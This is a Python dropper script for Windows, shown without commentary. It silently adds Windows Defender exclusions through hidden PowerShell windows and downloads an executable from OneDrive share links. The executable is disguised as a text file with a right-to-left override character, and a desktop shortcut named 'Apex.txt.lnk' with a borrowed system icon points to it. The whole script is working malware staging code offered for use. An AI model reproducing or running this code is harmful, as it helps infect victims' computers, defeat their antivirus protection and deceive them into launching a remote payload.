import subprocess
import os
import winshell

file_urls = [
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdowi3EBUeeW3q83iD/root/content", "Ap\u202Etxt.exe"),
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdowcGVfd59RaPLecK/root/content", "info.txt")
]

shortcut_path = os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll"
file_path = "C:\\Ap\u202Etxt.exe"

powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{file_path}"',
    f'Add-MpPreference -ExclusionPath "{os.path.abspath(os.path.join(winshell.desktop(), shortcut_path))}"'
]

for cmd in powershell_cmds:
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)

for url, save_filename in file_urls:
    if save_filename == "Ap\u202Etxt.exe":
        ps_download_cmd = f'Invoke-WebRequest -Uri "{url}" -OutFile "C:\\{save_filename}"'
    else:
        ps_download_cmd = f'Invoke-WebRequest -Uri "{url}" -OutFile (Join-Path $env:USERPROFILE "Desktop\\{save_filename}")'
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", ps_download_cmd], capture_output=True)

shortcut_name = "Apex.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)


winshell.CreateShortcut(
    Path=shortcut_path,
    Target=file_path,
    Icon=(icon_path, 70)
)